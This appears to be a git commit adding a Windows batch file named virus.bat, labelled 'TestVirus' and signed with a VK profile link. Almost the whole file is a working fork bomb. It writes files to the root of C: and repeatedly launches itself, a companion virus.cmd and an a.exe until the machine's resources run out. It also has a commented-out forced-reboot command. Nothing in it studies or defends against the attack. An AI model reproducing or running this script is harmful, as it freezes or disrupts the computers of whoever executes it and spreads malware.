7ea9775126e03c95eecfd33d00e6418c4ec12327
genisyspromcpe <khismatov@khismatov.ru>
2020-02-27 23:48:31 +0500

    Release

---
+++ virus.bat
@@ -0,0 +1,171 @@
+﻿@echo off
+TITLE TestVirus by ddosenka
+echo "vk.com/ddosenka"
+echo "vk.com/ddosenka"
+echo "vk.com/ddosenka"
+echo "vk.com/ddosenka"
+echo "vk.com/ddosenka"
+echo "vk.com/ddosenka"
+echo "vk.com/ddosenka"
+echo "vk.com/ddosenka"
+echo "vk.com/ddosenka"
+echo "vk.com/ddosenka"
+echo "vk.com/ddosenka"
+echo "vk.com/ddosenka"
+@echo Start file>C:\1.txt
+@echo Start file>C:\2.txt
+@echo Start file>C:\3.txt
+@echo Start file>C:\4.txt
+@echo Start file>C:\5.txt
+@echo Start file>C:\6.txt
+@echo Start file>C:\1.txt
+@echo Start file>C:\2.txt
+@echo Start file>C:\3.txt
+@echo Start file>C:\4.txt
+@echo Start file>C:\5.txt
+@echo Start file>C:\6.txt
+@echo Start file>C:\7.txt
+@echo Start file>C:\8.txt
+@echo Start file>C:\1.txt
+@echo Start file>C:\2.txt
+@echo Start file>C:\3.txt
+@echo Start file>C:\4.txt
+@echo Start file>C:\5.txt
+@echo Start file>C:\6.txt
+@echo Start file>C:\7.txt
+@echo Start file>C:\8.txt
+@echo Start file>C:\7.txt
+@echo Start file>C:\8.txt
+start virus.bat
+start virus.bat
+start virus.bat
+start virus.bat
+start virus.bat
+start virus.cmd
+start virus.cmd
+start virus.cmd
+start virus.cmd
+start virus.cmd
+start a.exe
+start a.exe
+start a.exe
+start a.exe
+start a.exe
+start a.exe
+start a.exe
+echo "vk.com/ddosenka"
+echo "vk.com/ddosenka"
+echo "vk.com/ddosenka"
+echo "vk.com/ddosenka"
+echo "vk.com/ddosenka"
+echo "vk.com/ddosenka"
+echo "vk.com/ddosenka"
+echo "vk.com/ddosenka"
+echo "vk.com/ddosenka"
+echo "vk.com/ddosenka"
+echo "vk.com/ddosenka"
+echo "vk.com/ddosenka"
+start a.exe
+start a.exe
+start a.exe
+start a.exe
+start a.exe
+start a.exe
+start a.exe
+start a.exe
+start a.exe
+start a.exe
+start a.exe
+start a.exe
+start a.exe
+start a.exe
+start a.exe
+start a.exe
+start a.exe
+start a.exe
+start a.exe
+start a.exe
+start a.exe
+start a.exe
+start a.exe
+start virus.bat
+start virus.bat
+start virus.bat
+start virus.bat
+start virus.bat
+start virus.cmd
+start virus.cmd
+start virus.cmd
+start virus.cmd
+start virus.cmd
+start virus.bat
+start virus.bat
+start virus.bat
+start virus.bat
+start virus.bat
+start virus.bat
+start virus.bat
+start virus.bat
+start virus.cmd
+start virus.cmd
+start virus.cmd
+start virus.cmd
+start virus.cmd
+start virus.bat
+start virus.bat
+start virus.bat
+start virus.bat
+start virus.bat
+start virus.cmd
+start virus.cmd
+start virus.cmd
+start virus.cmd
+start virus.cmd
+start virus.bat
+start virus.bat
+start virus.bat
+start virus.bat
+start virus.bat
+start virus.cmd
+start virus.cmd
+start virus.cmd
+start virus.cmd
+start virus.cmd
+start virus.bat
+start virus.bat
+start virus.bat
+start virus.bat
+start virus.bat
+start virus.cmd
+start virus.cmd
+start virus.cmd
+start virus.cmd
+start virus.cmd
+start virus.bat
+start virus.bat
+start virus.bat
+start virus.bat
+start virus.bat
+start virus.cmd
+start virus.cmd
+start virus.cmd
+start virus.cmd
+start virus.cmd
+start virus.bat
+start virus.bat
+start virus.bat
+start virus.bat
+start virus.bat
+start virus.cmd
+start virus.cmd
+start virus.cmd
+start virus.cmd
+start virus.cmd
+start virus.bat
+start virus.bat
+start virus.cmd
+start virus.cmd
+start virus.cmd
+start virus.cmd
+start virus.cmd
+rem shutdown.exe -r -f -t 00
